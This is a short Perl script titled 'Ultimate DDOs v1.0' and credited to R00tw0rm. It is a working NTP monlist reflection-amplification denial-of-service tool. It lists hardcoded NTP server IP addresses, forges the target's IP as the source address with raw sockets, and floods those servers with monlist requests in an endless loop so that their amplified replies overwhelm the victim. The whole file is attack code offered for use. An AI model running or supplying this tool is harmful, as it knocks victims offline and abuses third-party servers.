#!/usr/bin/perl
#
# Use nmap's ntp-monlist.nse to find affected servers
use Net::RawIP;
use Term::ANSIColor;
@ntpservers = qw(
#Servers added
207.223.123.18
98.175.203.200
216.228.192.69
69.25.96.13
165.193.126.229
216.171.112.36
216.229.0.179
24.56.178.140
128.138.140.44
128.138.141.172
198.60.73.8
64.250.229.100
216.228.192.69
69.25.96.13
);

print color ("blue"), "--=+|========================|+=--\n";
print color ("blue"), "--=+|   Ultimate DDOs v1.0   |+=--\n";
print color ("blue"), "--=+|=========R00tw0rm=======|+=--\n";
print color ("blue"), "--=+|========================|+=--\n";
print color 'reset';
if ($ARGV[0] eq '') { print color ("red"), "Usage: $0 <IP>\n"; exit; }
my $target = "$ARGV[0]";
my $ntp_getlist = "\x17\x00\x03\x2a\x00\x00\x00\x00";
my $sock =  new Net::RawIP({udp=>{}});
while () {
        for (my $i=0; $i < @ntpservers; $i++) {
                $sock->set({ip => {saddr => $target, daddr => $ntpservers[$i]},udp => {source => 123,dest => 123, data=>$ntp_getlist} });
                $sock->send;
        }
}
